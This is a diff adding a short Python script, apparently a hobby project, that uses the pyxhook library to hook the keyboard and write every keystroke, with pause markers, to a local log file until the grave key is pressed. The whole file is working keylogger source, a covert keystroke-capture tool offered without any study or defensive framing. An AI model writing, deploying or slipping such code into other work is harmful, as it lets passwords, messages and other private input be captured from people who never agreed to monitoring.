@@ -1,0 +1,47 @@
+#!/usr/bin/env python3
+
+import pyxhook # needs install via sudo pip3 install pyxhook
+import time
+
+#change this to your log file's path
+DIR = "/home/codeman/mydata/local/tmp"
+FILE = "keyloggfile.log"
+log_file= DIR + "/" + FILE
+
+PAUSE_TIME = 5
+
+fob=open(log_file,'a')
+
+oldTime = time.time()
+
+def calcTime():
+  global oldTime
+  returnStr = None
+  currTime = time.time()
+  timeDiff = currTime - oldTime
+  if timeDiff >= PAUSE_TIME:
+    returnStr = "\n{PAUSED " + str(int(timeDiff)) + " sec}\n"
+  oldTime = currTime
+  return returnStr
+
+#this function is called everytime a key is pressed.
+def OnKeyPress(event):
+  t = calcTime()
+  if t: fob.write(t)
+  fob.write(event.Key)
+  fob.write(" ")
+  fob.flush()
+  #fob.write('\n')
+
+  if event.Ascii==96: #96 is the ascii value of the grave key (`)
+    fob.close()
+    new_hook.cancel()
+
+#instantiate HookManager class
+new_hook=pyxhook.HookManager()
+#listen to all keystrokes
+new_hook.KeyDown=OnKeyPress
+#hook the keyboard
+new_hook.HookKeyboard()
+#start the session
+new_hook.start()
